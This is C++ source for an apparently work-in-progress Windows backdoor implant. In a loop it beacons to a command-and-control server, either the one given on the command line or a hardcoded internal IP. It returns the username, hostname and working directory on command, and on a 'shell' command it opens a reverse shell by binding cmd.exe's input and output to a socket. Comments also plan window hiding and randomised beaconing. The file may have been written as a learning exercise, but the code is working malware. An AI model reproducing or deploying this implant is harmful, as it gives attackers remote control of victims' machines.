#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#include <stdio.h>

// DEBUG, TEMP.
#include <iostream>

void whoami(char* returnval)
{
	DWORD bufferlen = 257;
	// Call WINAPI method, assign it's response to returnval pointer.
	GetUserNameA(returnval, &bufferlen);
}

void hostname(char* returnval)
{
	DWORD bufferlen = 257;
	GetComputerNameA(returnval,&bufferlen);
}

void pwd(char* returnval)
{
	char tempvar[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH,tempvar); //returns necessary value into tempvar
	strcat(returnval,tempvar); //you need to put that value into returnval
}

void Shell(char* C2Server, int C2Port)
{
	// FOR NOW IT CREATES NEW CONNECTION FOR SHELL
	// TODO : USE SAME SOCKET?

	SOCKET tcpsock;
	sockaddr_in addr;
	WSADATA version;
	// WSADATA object - contains details of application state regarding to network
	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2,2), &version);

	std::cout << "[DBG] Creating new socket again from shell connection..\n";
	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
	tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	// This if statement triggers if connection to C&C errored out.
	if (WSAConnect(tcpsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
		std::cout << "[DBG] Error during connection from within shell function..\n";
		closesocket(tcpsock);
		WSACleanup();
		return;
	}
	// Else connection successfull..
	else {
		std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
		
		char RecvData[1024];
		
		std::cout << "[DBG] 0\n";
		memset(RecvData, 0, sizeof(RecvData));
		
		std::cout << "[DBG] 1\n";
		// here waits for any data input from Server
		int RecvCode = recv(tcpsock, RecvData, 1024, 0);
		
		std::cout << "[DBG] 2\n";
		if (RecvCode <= 0){
			std::cout << "[DBG] RECVCODE = 0\n";
			closesocket(tcpsock);
			WSACleanup();
			return;
		}
		else {
			std::cout << "[DBG] 3\n";
			char Process[] = "cmd.exe";
			STARTUPINFOA sinfo;
			PROCESS_INFORMATION pinfo;
			memset(&sinfo, 0, sizeof(sinfo));
			
			std::cout << "[DBG] 4\n";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			
			std::cout << "[DBG] 5\n";
			// Socket is Handle for stdin/stdout/stderr descriptors of process
			sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
			
			std::cout << "[DBG] 6\n";
			CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
			WaitForSingleObject(pinfo.hProcess, INFINITE);
			
			std::cout << "[DBG] 7\n";
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			
			std::cout << "[DBG] 8\n";
			memset(RecvData, 0, sizeof(RecvData));
			
			/*int RecvCode = recv(tcpsock, RecvData, 1024, 0);
			
			std::cout << "[DBG] 9\n";
			if (RecvCode <= 0){
				std::cout << "[DBG] RECVCODE = 0 2nd time\n";
				closesocket(tcpsock);
				WSACleanup();
				return;
			}
			if (strcmp(RecvData, "exit\n") == 0) {
				closesocket(tcpsock);
				WSACleanup();
				return;
			}*/
		}
	}
}

void StartBeacon(char* C2Server, int C2Port)
{

	std::cout << "[DBG] New Beacon cycle triggered...\n";
	
	SOCKET tcpsock;
	sockaddr_in addr;
	WSADATA wsversion;
	// WSADATA object - contains details of application state regarding to network

	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2,2), &wsversion);

	std::cout << "[DBG] Creating new socket..\n";
	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
	tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	int SOCK_STATE;
	SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
	
	// This if statement performs connection and triggers if connection to C&C errored out.
	if (SOCK_STATE==SOCKET_ERROR) {
		std::cout << "[-] Connection unsuccessful...\n";
		closesocket(tcpsock);
		WSACleanup();
		return;
	}
	
	// Else connection successfull..
	else {
		std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
		
		while (true) {
			
			// Connection verification block START
			char RecvData[1024] = "";
			memset(RecvData, 0, sizeof(RecvData));
			
			// here waits for any data input from Server
			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
			std::cout << "[DBG] Recv: " << RecvData << std::endl;

			if (RecvCode <= 0){
				std::cout << "[DBG] RECVCODE = 0\n";
				closesocket(tcpsock);
				WSACleanup();
				return;
			}
			// Connection verification block END
			// ------------------

			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
			else if (strcmp(RecvData, "whoami\n") == 0) {
				char buffer[257] = ""; // reserve buffer with length of 257 bytes
				whoami(buffer); // call whoami function
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
			else if (strcmp(RecvData, "pwd\n") == 0) {
				char buffer[257] = "";
				pwd(buffer);
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(RecvData, "hostname\n") == 0) {
				char buffer[257] = "";
				hostname(buffer);
				strcat(buffer, "\n"); 
				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(RecvData, "shell\n") == 0) {
				Shell(C2Server,C2Port);
			}
			else if (strcmp(RecvData, "exit\n") == 0) {
				std::cout << "Command parsed: exit" << std::endl;
				std::cout << "Closing connection..." << std::endl;
				closesocket(tcpsock);
				WSACleanup();
				Sleep(1000);
				return;
			}
			else {
				std::cout << "[DBG]  Command received: " << RecvData << std::endl;
				char buffer[20] = "Invalid command\n";
				send(tcpsock,buffer,strlen(buffer)+1,0);
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			memset(RecvData, 0, sizeof(RecvData));
		}
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}

int main(int argc, char **argv)
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_SHOWNORMAL);

	std::cout << "Work in progress..\n";
	if (argc == 3)
	{
		int port = atoi(argv[2]);
		while (true) {
				// BEACONING
				// NEED TO IMPLEMENT RANDOM DELAY
				Sleep(5000); // 1000 ms = 1s

				StartBeacon(argv[1],port);
		}
	} else {
		char host[] = "192.168.56.112";
		int port = 8008;
			while (true) {
				// BEACONING
				// NEED TO IMPLEMENT RANDOM DELAY
				Sleep(5000); // 1000 ms = 1s

				StartBeacon(host,port);
		}
	}
	return 0;
}
